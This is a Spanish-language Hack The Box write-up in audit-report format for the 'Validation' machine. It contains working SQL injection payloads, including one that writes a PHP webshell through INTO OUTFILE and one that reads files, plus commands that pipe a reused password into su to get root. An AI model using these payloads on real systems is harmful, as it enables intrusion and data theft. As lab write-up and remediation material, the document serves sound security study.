# REPORTE DE AUDITORÍA - VALIDATION (Hack The Box)

## Resumen Ejecutivo

| Campo | Valor |
|-------|-------|
| **Máquina** | Validation |
| **IP Objetivo** | 10.129.95.235 |
| **Estado** | **PWNED** - Root completo |
| **Sistema** | Linux Debian 11 (bullseye) |
| **Stack** | Apache 2.4.48, PHP 7.4.23, MySQL/MariaDB |

---

## Fase 1: Reconocimiento

### Puertos Abiertos (Nmap)
```
22/tcp   - SSH
80/tcp   - HTTP (Apache httpd 2.4.48)
```

### Tecnologías Detectadas
- **Web Server**: Apache 2.4.48 (Debian)
- **PHP**: 7.4.23
- **DBMS**: MySQL >= 5.0 (MariaDB fork)
- **OS**: Linux Debian 11 (bullseye)

---

## Fase 2: Enumeración

### Aplicación Web
- Formulario de registro con campos: `username` y `country`
- Página de cuenta (`account.php`) muestra jugadores del mismo país
- Cookie de sesión basada en MD5 del username

### Archivos Encontrados
```
/index.php    - Formulario de registro
/account.php  - Página de cuenta (vulnerable)
/config.php   - Configuración de BD
```

---

## Fase 3: Explotación - SQL Injection en campo country

### Vulnerabilidad
**Tipo**: SQL Injection (Stored/Reflected)
**Ubicación**: `/account.php` línea 31
**Código vulnerable**:
```php
$sql = "SELECT username FROM registration WHERE country = '" . $row['country'] . "'";
```
**como lo pillamos desde burp**:
```
´' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' -- -
```

### Vector de Ataque
El campo `country` se almacena en la BD sin sanitizar. Cuando `account.php` consulta los jugadores del mismo país, el valor se concatena directamente en la query SQL.

### Payload Utilizado
```
' UNION SELECT LOAD_FILE('/home/htb/user.txt')-- -
```

### Técnicas SQLMap Identificadas
1. **Boolean-based blind** - AND boolean-based blind
2. **Error-based** - MySQL >= 5.0 OR error-based (FLOOR)
3. **Time-based blind** - MySQL >= 5.0.12 AND time-based blind (SLEEP)
4. **UNION query** - Generic UNION query (1 column)

---

## Fase 4: Post-Explotación

### Flags Obtenidas

| Flag | Hash |
|------|------|
| **user.txt** | `d6b3cc27a7f688da786bf0f34f73faa5` |
| **root.txt** | `9396ead1815d7c572c36d6dae0a3b97a` |

### Bases de Datos Encontradas
```
information_schema
mysql
performance_schema
registration
```

### Credenciales MySQL Extraídas
```
Usuario: uhc
Hash: *C6A38A5736CBA87E617301ECAB64184671128718
```

### Usuarios del Sistema (from /etc/passwd)
```
root:x:0:0:root:/root:/bin/bash
mysql:x:104:105:MySQL Server,,,:/nonexistent:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

---

## Fase 5: Escalada de Privilegios

### Vector de Ataque
**Tipo**: Password Reuse
**Credencial reutilizada**: `uhc-9qual-global-pw` (MySQL → root)

### Passos
1. **Webshell creada** en `/var/www/html/shell.php` via SQLi `INTO OUTFILE`
2. **Acceso como www-data** al ejecutar comandos via webshell
3. **Lectura de config.php** → Password MySQL: `uhc-9qual-global-pw`
4. **Password reutilizado** → `su -` con el mismo password accede a root

### Comando de Escalada
```bash
echo 'uhc-9qual-global-pw' | su - -c 'id'
uid=0(root) gid=0(root) groups=0(root)
```

### Obtención de root.txt
```bash
echo 'uhc-9qual-global-pw' | su - -c 'cat /root/root.txt'
9396ead1815d7c572c36d6dae0a3b97a
```

---

## Cadena de Ataque (MITRE ATT&CK)

| Fase | Técnica | ID |
|------|---------|-----|
| Reconocimiento | Active Scanning: Port Scan | T1595.002 |
| Initial Access | Exploitation of Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: SQL | T1059.008 |
| Credential Access | Unsecured Credentials: Database | T1552.001 |
| Collection | Data from Local System | T1005 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Credential Access | Credentials from Password Stores | T1555 |

---

## Código Fuente Analizado

### index.php (Líneas 1-20)
```php
<?php
  require('config.php');
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
    $userhash = md5($_POST['username']);
    $sql = "INSERT INTO registration (username, userhash, country, regtime) VALUES (?, ?, ?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("sssi", $_POST['username'], $userhash , $_POST['country'], time());
    // ...
  }
?>
```

### account.php (Línea 31 - VULNERABLE)
```php
$sql = "SELECT username FROM registration WHERE country = '" . $row['country'] . "'";
```

---

## Remediación Sugerida

1. **CRÍTICO**: Usar prepared statements con bind_param en account.php línea 31
2. **ALTO**: Sanitizar entrada del usuario antes de almacenar en BD
3. **MEDIO**: Implementar WAF para detectar patrones de SQLi
4. **MEDIO**: Validar y sanitizar el campo country en el frontend y backend

---

**Nota**: La flag root.txt no fue accesible via LOAD_FILE() debido a permisos del usuario MySQL.
